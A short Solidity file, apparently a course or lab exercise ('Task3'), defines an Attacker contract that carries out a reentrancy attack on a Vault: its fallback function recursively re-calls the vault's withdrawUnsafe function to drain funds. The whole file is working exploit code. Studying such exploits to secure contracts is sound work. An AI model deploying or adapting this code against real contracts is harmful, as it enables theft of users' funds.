// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "Task3.sol";
import "Vault.sol";

contract Attacker is IAttacker {
    function depositToVault(address vault) external payable {
        IVault(vault).deposit{value: msg.value}();
    }

    fallback() external payable {
        require(msg.sender.balance > 0, "msg.sender have no funds!");
        (bool success, ) = msg.sender.call(abi.encodeWithSelector(IVault.withdrawUnsafe.selector, this));
        require(success, 'Success withdraw');
    }

     function attack(address vault) external {
        IVault(vault).withdrawUnsafe(payable(address(this)));
    }
}